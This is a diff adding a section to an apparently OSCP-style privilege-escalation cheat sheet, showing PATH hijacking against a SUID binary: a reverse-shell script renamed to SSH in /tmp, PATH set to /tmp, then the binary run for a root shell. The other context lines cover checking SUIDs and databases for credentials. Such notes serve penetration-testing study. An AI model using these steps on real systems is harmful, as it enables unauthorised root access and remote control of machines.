@@ -463,6 +463,15 @@ Exploitable SUIDs / SGIDs:
 /usr/local/bin/{REDACTED} (OSCP)
 ```
 
+Exploit unquoted / non-fullpath binaries:
+* EXAMPLE: '/usr/local/bin/brian' is a SUID binary that references SSH in the program, but is unquoted.
+```bash
+$ mv reverse-shell.sh /tmp/SSH       # STEP 1: Move reverse-shell.sh to /tmp folder, renamed to SSH.
+$ export PATH=/tmp                   # STEP 2: Set home path to /tmp.
+$ /usr/local/bin/brian               # STEP 3: Execute SUID => because home path is /tmp, the SUID will execute the fake "SSH" instead of the real SSH located at /bin/SSH.
+                                     # Because the SUID is running as root and executes the reverse-shell, we will get a root shell.
+```
+
 Databases:
 * Check for presence of both MYSQL and MARIADB.
 * They may have two different types of databases to get creds / important info, so check for both.
